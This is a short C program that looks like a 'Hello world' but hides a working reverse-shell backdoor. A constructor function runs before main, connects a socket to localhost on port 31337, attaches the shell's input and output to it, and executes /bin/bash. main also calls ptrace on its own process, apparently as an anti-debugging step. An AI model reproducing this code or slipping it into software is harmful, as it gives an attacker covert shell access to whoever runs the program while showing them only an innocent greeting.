#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

int hostToIp(char *host, char *ip)
{
	struct hostent *he;
	struct in_addr **addrList;

	int i;

	if ((he = gethostbyname(host)) == NULL)
	{
		return -1;
	}

	addrList = (struct in_addr **)he->h_addr_list;

	for (i = 0; addrList[i] != NULL; ++i)
	{
		strcpy(ip, inet_ntoa(*addrList[i]));
		return 0;
	}

	return 0;
}

void backdoor(char *ip, int port)
{
	pid_t pid = fork();

	if (!pid)
	{
		//CHILD
		struct sockaddr_in sin;

		int sock;

		sin.sin_family = AF_INET;
		sin.sin_addr.s_addr = inet_addr(ip);
		sin.sin_port = htons(port);

		sock = socket(AF_INET, SOCK_STREAM, 0);

		connect(sock, (struct sockaddr *)&sin, sizeof(sin));

		dup2(sock, 0);
		dup2(sock, 1);
		dup2(sock, 2);

		execl("/bin/bash", "/bin/bash", (char *)0);
	}
}

__attribute__((constructor))
void init()
{
	char ip[100];

	hostToIp("localhost", ip);

	backdoor(ip, 31337);
}

int main(int argc, char **argv)
{
	printf("Hello world!\n");

	ptrace(PTRACE_ATTACH, getpid(), 0, 0);

	return 0;
}

